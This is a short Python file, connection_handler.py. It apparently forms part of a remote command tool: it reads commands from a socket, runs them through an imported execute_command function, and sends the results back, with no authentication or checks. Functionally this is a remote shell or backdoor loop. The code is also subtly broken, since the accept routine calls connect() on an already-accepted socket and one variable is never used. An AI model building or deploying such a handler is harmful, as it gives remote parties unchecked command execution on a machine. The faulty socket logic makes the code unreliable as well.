# connection_handler.py
from command_handler import execute_command

def connect_to_server(client, address):
    try:
        client.connect(address)
        active = True

        while True:
            command = client.recv(4096).decode('ascii')
            if not command:
                break

            result = execute_command(command)
            client.send(result.encode('ascii'))

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()


def accept_connections(server):
    try:
        while True:
            client, address = server.accept()
            print(f"Connection from {address}")

            connect_to_server(client, address)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.close()
